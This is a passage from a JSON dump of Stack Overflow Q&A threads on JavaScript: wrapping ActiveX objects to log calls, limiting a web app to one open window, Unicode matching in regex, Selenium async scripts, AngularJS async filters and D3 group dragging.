self._ax.responseText;\n                self.responseXml  = self._ax.responseXml;\n                self.status       = self._ax.status;\n                self.statusText   = self._ax.statusText;\n            }\n                if (self.onReadyStateChange) self.onReadyStateChange();\n            }\n        }();\n        o.open = function(bstrMethod, bstrUrl, varAsync, bstrUser, bstrPassword) {\n            console.log(\"intercepted open (\" + \n                bstrMethod + \" , \" + \n                bstrUrl + \" , \" + \n                varAsync + \" , \" + \n                bstrUser + \" , \" + \n                bstrPassword + \")\");\n            varAsync = (varAsync !== false);\n            this._ax.onReadyStateChange = this._onReadyStateChange\n            return this._ax.open(bstrMethod, bstrUrl, varAsync, bstrUser, bstrPassword);\n        };\n        o.send = function(varBody) {\n            return this._ax.send(varBody);\n        };\n    }\n    else\n        var o = ax;\n    return o;\n}\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I want to add some functionality track certain calls to ActiveX object methods in javascript. </p>\n\n<p>I usually create my activeX object like this:\nvar tconn = new ActiveXObject(\"Tconnector\");</p>\n\n<p>I need to log every time the <strong>open</strong> method is called on tconn and all other instances of that activeX control.</p>\n\n<p>I cant modify tconn's prototype because it does not have one! </p>\n\n<p>I think that i can create a dummy ActiveXObject function that creates a proxy object to proxy calls to the real one. Can you help me do that?</p>\n\n<p>Note: writing a direct wrapper is out of question, because there are already 1000s of calls to this activeX within the application.</p>\n",
            "last_activity_date": 1328438856,
            "question_id": 797960,
            "score": 7,
            "tags": [
                "javascript",
                "proxy",
                "activex"
            ],
            "title": "Extending an ActiveXObject in javascript"
        },
        {
            "answer_count": 11,
            "answers": [
                {
                    "body": "<p>You could check if a the user has more than one active session.  This might work, but could be problematic since there's no good way to determine if a session is really active or not.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I use the trick of opening a new window with a specific ID and always make sure that any page will open always use that window.</p>\n\n<p>The down side, they must have their popup blocker turned off for you site.  It works well for company sites.</p>\n\n<pre><code>if (useOwnWindow &amp;&amp; window.name != 'YourAPP'){\n    var w = window.open(document.location, 'YourAPP', 'toolbar=no,status=yes,resizable=yes,scrollbars=yes');\n    if (w==null){\n        alert(\"Please turn off your pop-up blocker\");\n    }else{\n        window.open('','_parent','');\n        self.opener=\"\";\n        self.close();\n    }\n }\n</code></pre>\n\n<p>Note the useOwnWindow flag if used by developers so <em>we</em> can open it multiple times</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<blockquote>\n  <p>Is there a simple way to determine if they already have a browser window open to the web application and if so, just close the browser or display a different page to let them know they can only have 1 open at a time?</p>\n</blockquote>\n\n<p>In short, No.<br />\nWithout writing some kind of activeX control, there is no code you could write that could stop the user from opening a (seperate instance of) IE/FF etc and having one instance detect the other.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>You could assign a 'mini-session' ID to each instance of the input form, then use AJAX to ping the server with that ID. If the user tries to request the same form when there's an active ID, it should display an error message. If the server doesn't hear the ping for a certain amount of time, expire the mini-session. (This is basically a very simple locking strategy)</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>I would suggest you hash the ViewState for the page and store it in a session variable before it is returned as the Response. </p>\n\n<p>Then for a Request first check the hash of the returned ViewState against the one you have in the session variable and if they don't match don't process any changes on the page and display a notice to your user or redirect them to an error page.</p>\n\n<p>The two methods of the Page class you will want to override are;</p>\n\n<pre><code>protected override object LoadPageStateFromPersistenceMedium()\n\nprotected override void SavePageStateToPersistenceMedium(object viewState)\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Firstly, no there isn't, and secondly, you shouldn't try.</p>\n\n<p>The pop-up window strategy won't work (and will annoy users). I have my browser set to 'Open windows as Tabs', and <em>I</em> choose whether to split one off into another window. Or in some cases, whether to run a different browser -- not just another instance of the same one -- to display another page on the same site.</p>\n\n<p>Conversely, the mini-session ID will fail because the server can't keep track of whether a request is from the same <em>user</em> as an existing session. Several people may be using the same machine, even with the same username; or one person may have several separate login sessions, on one or several machines.</p>\n\n<p>Just sort out your protocol vs. 'Session' variables and make sure that the last committed changes are the ones that persist.</p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>We have implemented a solution to this problem on the slicethepie.com.  Users (or \"scouts\") are only allowed to have one browser window open at a time to ensure they listen to the music they are being paid to review.</p>\n\n<p>When a scout requests the first track to review in their scouting session we set a new Guid on their account and return this \"key\" along with the details of the track they're being given to review.  It happens that the recipient of this key is a flash movie, but it doesn't have to be.  The key is re-submitted along with the scout's review, and we check to see if it matches the saved key.  If it doesn't they've started a new scouting session in a new window.</p>\n\n<p>I'm not implying this method is foolproof, but it could be adapted to your needs quite easily.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>As others has mentioned, you can't prevent the user from starting a new session without resorting to ActiveX or other nastiness. The basic problem is that there is no way for you to know whether a user closed the old browser window or left it open.</p>\n\n<p>What you can do however, is to invalidate the previous session as soon as the user logs into a new (A bit similar to how may Instant Messaging clients behave).</p>\n\n<p>On each login, assign a new GUID to the user in your database. Also store this GUID in the session cache (No need to ship it back and forth to the pages, which won't work for GET requests anyway). On each page request, compare the GUID assigned to the user in the database with the GUID in the session cache. If they don't match, return a \"You have logged in from somewhere else\" response.</p>\n\n<p><em>Update</em> I was a bit too fast on the trigger. This doesn't prevent the scenario where the user opens multiple tabs/windows within the same browser process. So you would have to combine this solution with Dave Anderson suggestion for storing a ViewState hash (or simply a GUID) so that only the last served page in a session is allowed to post back.</p>\n\n<p><em>Security Update</em> Also, you can only rely on this framework as a convenience to the user since it's not secure. Any half decent hacker will be able to circumvent these measures.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>If someone copy the website url and paste it in a new window or tab, the browser history for that window/tab will be empty... so you can  use javascript and check the history..</p>\n\n<pre><code>if (history.length == 1) {  //0 for IE, 1 for Firefox\n    // This is a new window or a new tab.\n}\n</code></pre>\n\n<p>Now you can prompt the user to close the tab, or disable that page (by making all elements <code>disabled</code> for example).</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>All you have to do is assign a value both to a Hidden Input control's value and to a session variable in the Page Load event and on postback, check the value of the local variable against the value in the session variable.  If the values do not match, you can redirect the user to the login page or a page that tells them that the session for that page is no longer valid etc.</p>\n\n<p>Example:</p>\n\n<pre class=\"lang-vb prettyprint-override\"><code>Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load\n    Try\n        If Not IsPostBack Then\n            'SET LOCAL VARIABLE AND SESSION VARIABLE TO A UNIQUE VALUE\n            'IF THE USER HAS CHANGED TABS THIS WILL CHANGE THE VALUE OF THE SESSION VARIABLE\n            Me.HiddenInput.value = New Guid().ToString\n            Me.Session.Add(\"PageGuid\", Me.HiddenInput.value)\n\n        Else \n            'ON POSTBACK, CHECK TO SEE IF THE USER HAS OPENED A NEW TAB\n            'BY COMPARING THE VALUE OF THE LOCAL VALUE TO THE VALUE OF THE SESSION VARIABLE\n\n            If me.HiddenInput.value &lt;&gt; CType(Session(\"PageGuid\"), String) Then\n\n                'THE VALUES DO NOT MATCH, MEANING THE USER OPENED A NEW TAB.\n                'REDIRECT THE USER SOMEWHERE HARMLESS\n\n                Response.Redirect(\"~/Home.aspx\")\n\n            Else\n\n                'THE VALUES MATCH, MEANING THE USER HAS NOT OPENED A NEW TAB\n                'PERFORM NORMAL POSTBACK ACTIONS\n\n                ...\n\n            End If\n        End If\n    Catch ex As Exception\n        Me.Session.Add(\"ErrorMessage\", BusinessLogic.GetErrorMessage(ex))\n        Me.Response.Redirect(\"~/ErrorPage.aspx\", False)\n    End Try\nEnd Sub\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>You can stop the page functionality when user opened another tab or another window or even another browser</p>\n\n<pre><code>  $(window).blur(function(){\n\n// code to stop functioning or close the page  \n\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I'm wondering if it is possible to determine if a user already has a web browser open to the web application I'm working on. It seems that they can open several instances of the same web app and click on buttons to read information that they have used before to enter into an input screen that they're currently working on.</p>\n\n<p>What happens though is that it seems to screw up Session variables and then the user will update their previous work with their new work. Or they will delete their previous work all together or who knows...</p>\n\n<p><strong><em>EDIT</em></strong>\n<em>I have seen this done before with online banking web applications. If you are already logged in, the new window will kindly tell you that you already have the app open. In my case, the user does not need to log in.</em></p>\n\n<p>Is there a simple way to determine if they already have a browser window open to the web application and if so, just close the browser or display a different page to let them know they can only have 1 open at a time?</p>\n\n<p>Thanks</p>\n",
            "last_activity_date": 1425565358,
            "question_id": 557733,
            "score": 7,
            "tags": [
                "asp.net",
                "javascript",
                "visual-studio-2005"
            ],
            "title": "How to prevent a user from having multiple instances of the Same Web application"
        },
        {
            "answer_count": 10,
            "answers": [
                {
                    "body": "<p>Perhaps \\S (non-whitespace).</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Because \\w only matches ASCII characters 48-57 ('0'-'9'), 67-90 ('A'-'Z') and 97-122 ('a'-'z').  Hebrew characters and other special foreign language characters (for example, umlaut-o or tilde-n) are outside of that range.</p>\n\n<p>Instead of matching foreign language characters (there are so many of them, in many different ASCII ranges), you might be better off looking for the characters that delineate your words - spaces, quotation marks, and other punctuation.</p>\n",
                    "is_accepted": true,
                    "score": 16
                },
                {
                    "body": "<p>Have a look at <a href=\"http://www.regular-expressions.info/refunicode.html\" rel=\"nofollow\">http://www.regular-expressions.info/refunicode.html</a>. </p>\n\n<p>It looks like there is no \\w equivalent for unicode, but you can match single unicode letters, so you can create it.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Check <a href=\"http://stackoverflow.com/questions/280712/javascript-unicode\">this SO Question about JavaScript and Unicode</a> out. Looks like Jan Goyvaerts answer there provides some hope for you.</p>\n\n<p>Edit: But then it seems all browsers don't support \\p ... anyway. That question should contain useful info.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>If you're the one generating URLs with non-english letters in it, you may want to reconsider.</p>\n\n<p>If I'm interpreting the W3C correctly, <a href=\"http://labs.apache.org/webarch/uri/rfc/rfc3986.html#transcription\" rel=\"nofollow\">URLs may only contain word characters within the latin alphabet</a>.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>The ECMA 262 v3 standard, which defines the programming language commonly known as JavaScript, stipulates that \\w should be equivalent to [a-zA-Z0-9_] and that \\d should be equivalent to [0-9]. \\s on the other hand matches both ASCII and Unicode whitespace, according to the standard.</p>\n\n<p>JavaScript does not support the \\p syntax for matching Unicode things either, so there isn't a good way to do this.  You could match all Hebrew characters with:</p>\n\n<p>[\\u0590-\\u05FF]</p>\n\n<p>This simply matches any code point in the Hebrew block.</p>\n\n<p>You can match any ASCII word character or any Hebrew character with:</p>\n\n<p>[\\w\\u0590-\\u05FF]</p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>Note that URIs (as superset of URLs) are specified by W3C to only allow US-ASCII characters.\nNormally all other characters should be represented by percent-notation:</p>\n\n<blockquote>\n  <p>In local or regional contexts and with\n  improving technology, users might\n  benefit from being able to use a wider\n  range of characters; such use is not\n  defined by this specification.\n  Percent-encoded octets (Section 2.1)\n  may be used within a URI to represent\n  characters outside the range of the\n  US-ASCII coded character set if this\n  representation is allowed by the\n  scheme or by the protocol element in\n  which the URI is referenced. Such a\n  definition should specify the\n  character encoding used to map those\n  characters to octets prior to being\n  percent-encoded for the URI. // <a href=\"http://labs.apache.org/webarch/uri/rfc/rfc3986.html#generic-syntax\" rel=\"nofollow\">URI: Generic Syntax</a></p>\n</blockquote>\n\n<p>Which is what generally happens when you open an URL with non-ASCII characters in browser, they get translated into %AB notation, which, in turn, <strong>is</strong> US-ASCII.</p>\n\n<p>If it is possible to influence the way the material is created, the best option would be to subject URLs to urlencode() type function during their creation.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I think you are looking for this regex:</p>\n\n<pre><code>^[\u05d0\u05d1\u05d2\u05d3\u05d4\u05d5\u05d6\u05d7\u05d8\u05d9\u05db\u05dc\u05de\u05e0\u05e1\u05e2\u05e4\u05e6\u05e7\u05e8\u05e9\u05ea\u05e5\u05e3\u05df\u05dda-zA-z0-9\\s\\.\\-_\\\\\\/]+$\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>I've just found <a href=\"http://xregexp.com/\" rel=\"nofollow\">XRegExp</a> which has not been mentioned yet and I'm quite impressed with it. It is an alternative regular expression implementation, has a <a href=\"http://xregexp.com/plugins/\" rel=\"nofollow\">unicode plugin</a> and is licensed under MIT license.</p>\n\n<p>According to the website, to match unicode chars, you'd use such code:</p>\n\n<pre><code>var unicodeWord = XRegExp(\"^\\\\p{L}+$\");\n\nunicodeWord.test(\"\u0420\u0443\u0441\u0441\u043a\u0438\u0439\"); // true\nunicodeWord.test(\"\u65e5\u672c\u8a9e\"); // true\nunicodeWord.test(\"\u0627\u0644\u0639\u0631\u0628\u064a\u0629\"); // true\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Try this \\p{L}\nthe unicode regex to Letters</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I'm trying to find URLs in some text, using javascript code. The problem is, the regular expression I'm using uses \\w to match letters and digits inside the URL, but it doesn't match non-english characters (in my case - Hebrew letters). </p>\n\n<p>So what can I use instead of \\w to match all letters in all languages?</p>\n",
            "last_activity_date": 1366992160,
            "question_id": 397788,
            "score": 7,
            "tags": [
                "javascript",
                "regex",
                "hebrew"
            ],
            "title": "Why does \\w match only English words in javascript regex?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Here's the <a href=\"http://selenium.googlecode.com/svn/trunk/docs/api/java/org/openqa/selenium/JavascriptExecutor.html\" rel=\"nofollow\">reference</a> to the two APIs (well it's Javadoc, but the functions are the same), and here's an excerpt from it that highlights the difference</p>\n\n<blockquote>\n  <p>[executeAsyncScript] Execute an asynchronous piece of JavaScript in\n  the context of the currently selected frame or window. Unlike\n  executing synchronous JavaScript, scripts executed with this method\n  must explicitly signal they are finished by invoking the provided\n  callback. This callback is always injected into the executed function\n  as the last argument.</p>\n</blockquote>\n\n<p>Basically, execSync blocks further actions being performed by the selenium browser, while execAsync does not block and calls on a <code>callback</code> when it's done. </p>\n\n<hr>\n\n<p>Since you've worked with protractor, I'll use that as example. \nProtractor uses <code>executeAsyncScript</code> in both <a href=\"https://github.com/angular/protractor/blob/master/lib/protractor.js#L473\" rel=\"nofollow\"><code>get</code></a> and <a href=\"https://github.com/angular/protractor/blob/master/lib/protractor.js#L276\" rel=\"nofollow\"><code>waitForAngular</code></a></p>\n\n<p>In <code>waitForAngular</code>, protractor needs to wait until angular announces that all events settled. You can't use <code>executeScript</code> because that needs to return a value at the end (although I guess you can implement a busy loop that polls angular constantly until it's done). The way it works is that protractor provides a callback, which Angular calls once all events settled, and that requires executeAsyncScript. Code <a href=\"https://github.com/angular/protractor/blob/master/lib/clientsidescripts.js#L29\" rel=\"nofollow\">here</a></p>\n\n<p>In <code>get</code>, protractor needs to poll the page until the global <code>window.angular</code> is set by Angular. One way to do it is <code>driver.wait(function() {driver.executeScript('return window.angular')}, 5000)</code>, but that way protractor would pound at the browser every few ms. Instead, we do this (simplified):</p>\n\n<pre><code>functions.testForAngular = function(attempts, callback) {\n  var check = function(n) {\n    if (window.angular) {\n      callback('good');\n    } else if (n &lt; 1) {\n      callback('timedout');\n    } else {\n      setTimeout(function() {check(n - 1);}, 1000);\n    }\n  };\n  check(attempts);\n};\n</code></pre>\n\n<p>Again, that requires <code>executeAsyncScript</code> because we don't have a return value immediately. Code <a href=\"https://github.com/angular/protractor/blob/master/lib/clientsidescripts.js#L519\" rel=\"nofollow\">here</a> </p>\n\n<hr>\n\n<p>All in all, use <code>executeAsyncScript</code> when you care about a return value in a calling script, but that return value won't be available immediately. This is especially necessary if you can't poll for the result, but must get the result using a callback or promise (which you must translate to callback yourself). </p>\n",
                    "is_accepted": true,
                    "score": 5
                },
                {
                    "body": "<blockquote>\n  <p>When should I use <code>execute_async_script()</code> instead of the regular <code>execute_script()</code>?</p>\n</blockquote>\n\n<p>When it comes to checking conditions on the browser side, <strong>all checks you can perform with <code>execute_async_script</code> can be performed with <code>execute_script</code>. Even if what you are checking is asynchronous.</strong> I know because once upon a time there was a bug with <code>execute_async_script</code> that made my tests fail if the script returned results too quickly. As far as I can tell, the bug is gone now so I've been using <code>execute_async_script</code> but for months beforehand, I used <code>execute_script</code> for tasks where <code>execute_async_script</code> would have been more natural. For instance, performing a check that requires loading a module with RequireJS to perform the check:</p>\n\n<pre><code>driver.execute_script(\"\"\"\n// Reset in case it's been used already.\nwindow.__selenium_test_check = undefined;\nrequire([\"foo\"], function (foo) {\n    window.__selenium_test_check = foo.computeSomething();\n});\n\"\"\")\n\nresult = driver.wait(lambda driver: \n    driver.execute_script(\"return window.__selenium_test_check;\"))\n</code></pre>\n\n<p>The <code>require</code> call is asynchronous. The problem with this though, besides leaking a variable into the global space, is that it multiplies the network requests. Each <code>execute_script</code> call is a network request. The <code>wait</code> method works by polling: it runs the test until the returned value is true. This means one network request per check that <code>wait</code> performs (in the code above). </p>\n\n<p>When you test locally it is not a big deal. If you have to go through the network because you are having the browsers provisioned by a service like Sauce Labs (which I use, so I'm talking from experience), each network request slows down your test suite. <strong>So using <code>execute_async_script</code> not only allows writing a test that looks more natural (call a callback, as we normally do with asynchronous code, rather than leak into the global space) but it also helps the performance of your tests.</strong></p>\n\n<pre><code>result = driver.execute_async_script(\"\"\"\nvar done = arguments[0];\nrequire([\"foo\"], function (foo) {\n    done(foo.computeSomething());\n});\n\"\"\")\n</code></pre>\n\n<p>The way I see it now is that if a test is going to hook into asynchronous code on the browser side to get a result, I use <code>execute_async_script</code>. If it is going to do something for which there is no asynchronous method available, I use <code>execute_script</code>.</p>\n",
                    "is_accepted": false,
                    "score": 4
                }
            ],
            "body": "<p>I've been using <code>selenium</code> (with <a href=\"http://selenium-python.readthedocs.org/\">python bindings</a> and through <a href=\"http://angular.github.io/protractor/#/\"><code>protractor</code></a> mostly) for a rather long time and every time I needed to execute a javascript code, I've used <code>execute_script()</code> method. For example, <a href=\"http://selenium-python.readthedocs.org/en/latest/faq.html#how-to-scroll-down-to-the-bottom-of-a-page\">for scrolling the page</a> (python):</p>\n\n<pre><code>driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);\")\n</code></pre>\n\n<p>Or, for <a href=\"http://stackoverflow.com/questions/27794316/protractor-scrolling-a-table-and-testing-for-infinite-scroll\">infinite scrolling inside an another element</a> (protractor):</p>\n\n<pre><code>var div = element(by.css('div.table-scroll'));\nvar lastRow = element(by.css('table#myid tr:last-of-type'));\n\nbrowser.executeScript(\"return arguments[0].offsetTop;\", lastRow.getWebElement()).then(function (offset) {\n    browser.executeScript('arguments[0].scrollTop = arguments[1];', div.getWebElement(), offset).then(function() {\n        // assertions\n\n    });\n});\n</code></pre>\n\n<p>Or, for getting a <a href=\"http://stackoverflow.com/questions/27307131/selenium-webdriver-how-do-i-find-all-of-an-elements-attributes\">dictionary of all element attributes</a> (python):</p>\n\n<pre><code>driver.execute_script('var items = {}; for (index = 0; index &lt; arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', element)\n</code></pre>\n\n<hr>\n\n<p>But, WebDriver API also has <a href=\"http://selenium-python.readthedocs.org/en/latest/api.html#selenium.webdriver.remote.webdriver.WebDriver.execute_async_script\"><code>execute_async_script()</code></a> which I haven't personally used.</p>\n\n<p>What use cases does it cover? When should I use <code>execute_async_script()</code> instead of the regular <code>execute_script()</code>?</p>\n\n<p><sup>The question is selenium-specific, but language-agnostic.</sup></p>\n",
            "last_activity_date": 1423334112,
            "question_id": 28057338,
            "score": 6,
            "tags": [
                "javascript",
                "python",
                "selenium",
                "selenium-webdriver",
                "protractor"
            ],
            "title": "Understanding execute async script in Selenium"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Here is an example:</p>\n\n<pre><code>app.filter(\"testf\", function($timeout) {\n    var data = null, // DATA RECEIVED ASYNCHRONOUSLY AND CACHED HERE\n        serviceInvoked = false;\n\n    function realFilter(value) { // REAL FILTER LOGIC\n        return ...;\n    }\n\n    return function(value) { // FILTER WRAPPER TO COPE WITH ASYNCHRONICITY\n        if( data === null ) {\n            if( !serviceInvoked ) {\n                serviceInvoked = true;\n                // CALL THE SERVICE THAT FETCHES THE DATA HERE\n                callService.then(function(result) {\n                    data = result;\n                });\n            }\n            return \"-\"; // PLACEHOLDER WHILE LOADING, COULD BE EMPTY\n        }\n        else return realFilter(value);\n    }\n});\n</code></pre>\n\n<p>This <a href=\"http://jsfiddle.net/fJC5Q/3/\" rel=\"nofollow\">fiddle</a> is a demonstration using timeouts instead of services.</p>\n\n<hr>\n\n<p>EDIT: As per the comment of sgimeno, extra care must be taken for not calling the service more than once. See the <code>serviceInvoked</code> changes in the code above and the fiddles. See also forked fiddle with Angular 1.2.1 and a button to change the value and trigger digest cycles: <a href=\"http://jsfiddle.net/USje9/1/\" rel=\"nofollow\">forked fiddle</a></p>\n\n<hr>\n\n<p>EDIT 2: As per the comment of Miha Er\u017een, this solution does no logner work for Angular 1.3. The solution is almost trivial though, using the <code>$stateful</code> filter flag, documented <a href=\"https://code.angularjs.org/1.3.7/docs/guide/filter\" rel=\"nofollow\">here</a> under \"Stateful filters\", and the necessary <a href=\"http://jsfiddle.net/oh8j2s9m/\" rel=\"nofollow\">forked fiddle</a>.</p>\n\n<p><em>Do note</em> that this solution would hurt performance, as the filter is called each digest cycle. The performance degradation could be negligible or not, depending on the specific case.</p>\n",
                    "is_accepted": true,
                    "score": 13
                },
                {
                    "body": "<p>Let's start with understanding why the original code doesn't work. I've simplified the original question a bit to make it more clear:</p>\n\n<pre><code>angular.module('angularApp').filter('pathToName', function(Service) {\n\n    return function(input) {\n        return Service.getCorresp().then(function(response) {\n            return response;\n        });\n    });\n\n}\n</code></pre>\n\n<p>Basically, the filter calls an async function that returns the promise, then returns its value. A filter in angular expects you to return a value that can be easily printed, e.g string or number. However, in this case, even though it seems like we're returning the <code>response</code> of <code>getCorresp</code>, we are <strong>actually</strong> returning a <strong>new promise</strong> - The return value of any <code>then()</code> or <code>catch()</code> function is a <strong>promise</strong>.</p>\n\n<p>Angular is trying to convert a promise object to a string via casting, getting nothing sensible in return and displays an empty string.</p>\n\n<hr>\n\n<p>So what we need to do is, return a temporary <strong>string</strong> value and change it asynchroniously, like so:</p>\n\n<p><kbd><a href=\"http://jsfiddle.net/oh8j2s9m/11/\" rel=\"nofollow\">JSFiddle</a></kbd></p>\n\n<p>HTML:</p>\n\n<pre><code>&lt;div ng-app=\"app\" ng-controller=\"TestCtrl\"&gt;\n    &lt;div&gt;{{'WelcomeTo' | translate}}&lt;/div&gt;\n    &lt;div&gt;{{'GoodBye' | translate}}&lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>Javascript:</p>\n\n<pre><code>app.filter(\"translate\", function($timeout, translationService) {\n\n    var isWaiting = false;\n    var translations = null;\n\n    function myFilter(input) {\n\n        var translationValue = \"Loading...\";\n        if(translations)\n        {\n            translationValue = translations[input];\n        } else {\n            if(isWaiting === false) {\n                isWaiting = true;\n                translationService.getTranslation(input).then(function(translationData) {\n                    console.log(\"GetTranslation done\");\n                    translations = translationData;\n                    isWaiting = false;\n                });\n            }\n        }\n\n        return translationValue;\n    };\n\n    return myFilter;\n});\n</code></pre>\n\n<p>Everytime Angular tries to execute the filter, it would check if the translations were fetched already and if they weren't, it would return the \"Loading...\" value. We also use the <code>isWaiting</code> value to prevent calling the service more than once.</p>\n\n<p>The example above works fine for Angular 1.2, however, among the changes in Angular 1.3, there is a performance improvement that changes the behavior of filters. Previously the filter function was called every digest cycle. Since 1.3, however, it only calls the filter if the value was changed, in our last sample, it would never call the filter again - <code>'WelcomeTo'</code> would never change.</p>\n\n<p>Luckily the fix is very simple, you'd just need to add to the filter the following: </p>\n\n<p><kbd><a href=\"http://jsfiddle.net/oh8j2s9m/10/\" rel=\"nofollow\">JSFiddle</a></kbd></p>\n\n<pre><code>myFilter.$stateful = true;\n</code></pre>\n\n<hr>\n\n<p>Finally, while dealing with this issue, I had another problem - I needed to use a filter to get async values that <strong>could change</strong> - Specifically, I needed to fetch translations for a single language, but once the user changed the language, I needed to fetch a new language set. Doing that, proved a bit more tricky, though the concept is the same. This is that code:</p>\n\n<p><kbd><a href=\"http://jsfiddle.net/oh8j2s9m/9/\" rel=\"nofollow\">JSFiddle</a></kbd></p>\n\n<pre><code>var app = angular.module(\"app\",[]);\ndebugger;\n\napp.controller(\"TestCtrl\", function($scope, translationService) {\n    $scope.changeLanguage = function() {\n        translationService.currentLanguage = \"ru\";\n    }\n});\n\napp.service(\"translationService\", function($timeout) {\n    var self = this;\n\n    var translations = {\"en\": {\"WelcomeTo\": \"Welcome!!\", \"GoodBye\": \"BYE\"}, \n                        \"ru\": {\"WelcomeTo\": \"POZHALUSTA!!\", \"GoodBye\": \"DOSVIDANYA\"} };\n\n    this.currentLanguage = \"en\";\n    this.getTranslation = function(placeholder) {\n        return $timeout(function() {\n            return translations[self.currentLanguage][placeholder];\n        }, 2000);\n    }\n})\n\napp.filter(\"translate\", function($timeout, translationService) {\n\n    // Sample object: {\"en\": {\"WelcomeTo\": {translation: \"Welcome!!\", processing: false } } }\n    var translated = {};\n    var isWaiting = false;\n\n    myFilter.$stateful = true;\n    function myFilter(input) {\n\n        if(!translated[translationService.currentLanguage]) {\n            translated[translationService.currentLanguage] = {}\n        }\n\n        var currentLanguageData = translated[translationService.currentLanguage];\n        if(!currentLanguageData[input]) {\n            currentLanguageData[input] = { translation: \"\", processing: false };\n        }\n\n        var translationData = currentLanguageData[input];\n        if(!translationData.translation &amp;&amp; translationData.processing === false)\n        {\n            translationData.processing = true;\n            translationService.getTranslation(input).then(function(translation) {\n                console.log(\"GetTranslation done\");\n                translationData.translation = translation;\n                translationData.processing = false;\n            });\n        }\n\n        var translation = translationData.translation;\n        console.log(\"Translation for language: '\" + translationService.currentLanguage + \"'. translation = \" + translation);\n        return translation;\n    };\n\n    return myFilter;\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I'm having trouble trying to initialize a filter with asynchronous data.</p>\n\n<p>The filter is very simple, it needs to translate paths to name, but to do so it needs a correspondance array, which I need to fetch from the server.</p>\n\n<p>I could do things in the filter definition, before returning the function, but the asynchronous aspect prevents that</p>\n\n<pre><code>angular.module('angularApp').\n  filter('pathToName', function(Service){\n    // Do some things here\n\n    return function(input){\n      return input+'!'\n    }\n  }\n</code></pre>\n\n<p>Using a promise may be viable but I don't have any clear understanding on how angular loads filters.\nThis <a href=\"http://stackoverflow.com/questions/16286605/initialize-angularjs-service-with-asynchronous-data\">post</a> explains how to achieve such magic with services, but is it possible to do the same for filters?</p>\n\n<p>And if anyone has a better idea on how to translate those paths, I'm all ears.</p>\n\n<p>EDIT:</p>\n\n<p>I tried with the promise approch, but something isn't right, and I fail to see what:</p>\n\n<pre><code>angular.module('angularApp').filter('pathToName', function($q, Service){\n\n  var deferred = $q.defer();\n  var promise = deferred.promise;\n\n  Service.getCorresp().then(function(success){\n    deferred.resolve(success.data);\n  }, function(error){\n    deferred.reject();\n  });\n\n  return function(input){\n    return promise.then(\n      function(corresp){\n        if(corresp.hasOwnProperty(input))\n          return corresp[input];\n        else\n          return input;\n      }\n    )\n  };\n});\n</code></pre>\n\n<p>I'm not really familliar with promises, is it the right way to use them?</p>\n",
            "last_activity_date": 1420412012,
            "question_id": 19046641,
            "score": 6,
            "tags": [
                "javascript",
                "angularjs",
                "asynchronous",
                "filter"
            ],
            "title": "Asynchronously initialize AngularJS filter"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>First off, the &lt;g> element doesn't care about <code>x</code>and <code>y</code> attributes (as in: they're just ignored). You can use <code>transform=\"translate(x,y)\"</code> instead.</p>\n\n<p>Second, you will need to check that the element you get in the dragmove handler actually is the &lt;g> element, and not a child element of it. This is because &lt;g> elements have no actual hit area themselves. Their children do though, and the mouse events first go to the children then bubble up to the parent. You can inspect <code>evt.target</code> and <code>evt.currentTarget</code> to see this in action. <code>target</code> is the element that was hit originally, <code>currentTarget</code> is the event target that is currently handling the event (e.g the &lt;g> element if the event bubbled up).</p>\n",
                    "is_accepted": true,
                    "score": 9
                }
            ],
            "body": "<p>i am using <a href=\"https://github.com/mbostock/d3/wiki/Drag-Behavior#wiki-on\">D3js drag</a>. single element is get dragged perfectly fine. but i want to drag a group of elements.How it can be done . here is <a href=\"http://jsfiddle.net/xnjGD/1/\">Js Fiddle link</a>. i want to drag both rect and text simultaneously.here<a href=\"http://jsfiddle.net/xnjGD/2/\"> i tried</a> but no luck. help me, i know i am missing something simple.<code>&lt;&gt;</code></p>\n",
            "last_activity_date": 1365668664,
            "question_id": 15943292,
            "score": 6,
            "tags": [
                "javascript",
                "dom",
                "svg",
                "d3.js"
            ],
            "title": "how to drag svg group using d3js drag behavior"
        },
        {
            "answer_count": 5,
            "answers": [
                {
